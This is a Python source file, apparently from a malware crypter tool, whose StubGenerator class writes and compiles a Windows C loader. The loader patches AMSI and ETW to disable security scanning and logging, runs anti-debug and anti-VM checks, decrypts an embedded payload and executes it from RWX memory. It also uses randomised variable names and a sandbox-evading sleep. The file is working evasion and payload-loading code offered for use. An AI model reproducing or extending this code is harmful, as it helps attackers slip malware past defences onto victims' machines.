import os
import random
import string
from .compiler import DynamicCompiler
from ..encryption.keygen import KeyGenerator


class StubGenerator:
    def __init__(self, evasion_level="High"):
        self.evasion_level = evasion_level
        self.compiler = DynamicCompiler()

    def generate_stub(self, encrypted_data, keys, output_dir):
        var_names = self._generate_random_names(25)
        stub_code = self._generate_stub_template(encrypted_data, keys, var_names)

        if self.evasion_level.lower() in ["high", "maximum"]:
            stub_code = self._add_evasion(stub_code, var_names)

        stub_path = os.path.join(output_dir, "stub.c")
        with open(stub_path, "w") as f:
            f.write(stub_code)

        exe_path = self.compiler.compile_stub(stub_path, output_dir)
        return exe_path
        
    def to_c_array(data):
        return ', '.join([f'0x{b:02x}' for b in data])

    def _generate_random_names(self, count):
        return [''.join(random.choices(string.ascii_letters, k=random.randint(8, 14))) for _ in range(count)]

    def _bytes_to_c_array(self, data):
        return ', '.join(f"0x{b:02x}" for b in data)

    def _generate_stub_template(self, encrypted_data, keys, var_names):
        data_array = self._bytes_to_c_array(encrypted_data)
        key_array = self._bytes_to_c_array(keys["aes_key"])
        nonce_array = self._bytes_to_c_array(keys["nonce"])

        return f"""
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Patch AMSI + ETW (inline)
void PatchAMSI() {{
    unsigned char patch[] = {{ 0xC3 }};
    void* addr = GetProcAddress(LoadLibraryA("amsi.dll"), "AmsiScanBuffer");
    DWORD oldProtect;
    VirtualProtect(addr, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(addr, patch, 1);
    VirtualProtect(addr, 1, oldProtect, &oldProtect);
}}

void PatchETW() {{
    unsigned char patch[] = {{ 0xC3 }};
    void* addr = GetProcAddress(LoadLibraryA("ntdll.dll"), "EtwEventWrite");
    DWORD oldProtect;
    VirtualProtect(addr, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(addr, patch, 1);
    VirtualProtect(addr, 1, oldProtect, &oldProtect);
}}

// Anti-debug / Anti-VM / Anti-sandbox
BOOL DetectBadEnv() {{
    if (IsDebuggerPresent()) return TRUE;

    MEMORYSTATUSEX mem;
    mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < (2LL * 1024 * 1024 * 1024)) return TRUE;  // < 2GB RAM

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\\\Oracle\\\\VirtualBox Guest Additions", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {{
        RegCloseKey(hKey);
        return TRUE;
    }}
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\\\VMware, Inc.\\\\VMware Tools", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {{
        RegCloseKey(hKey);
        return TRUE;
    }}

    return FALSE;
}}

// Buffer de données chiffrées
unsigned char {var_names[0]}[] = {{ {data_array} }};
unsigned char {var_names[1]}[] = {{ {key_array} }};
unsigned char {var_names[2]}[] = {{ {nonce_array} }};

// XOR fake decrypt (remplacez par vraie lib crypto)
unsigned char* {var_names[3]}(unsigned char* data, int len) {{
    unsigned char* out = (unsigned char*)malloc(len);
    for (int i = 0; i < len; i++) {{
        out[i] = data[i] ^ {var_names[1]}[i % sizeof({var_names[1]})];
    }}
    return out;
}}

int main() {{
    PatchAMSI();
    PatchETW();

    if (DetectBadEnv()) return 0;

    unsigned char* decrypted = {var_names[3]}({var_names[0]}, sizeof({var_names[0]}));
    if (!decrypted) return -1;

    void* exec = VirtualAlloc(0, sizeof({var_names[0]}), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec) return -2;

    memcpy(exec, decrypted, sizeof({var_names[0]}));
    ((void(*)())exec)();

    free(decrypted);
    return 0;
}}
"""

    def _add_evasion(self, stub_code, var_names):
        """
        Peut injecter du junk, des sleep aléatoires, ou polymorphisme en plus.
        Cette version ajoute un faux délai de sandbox.
        """
        evasion_snippet = f"""
    // Fausse latence pour sandbox
    Sleep(3000);
"""
        return stub_code.replace("int main() {", f"int main() {{{evasion_snippet}")
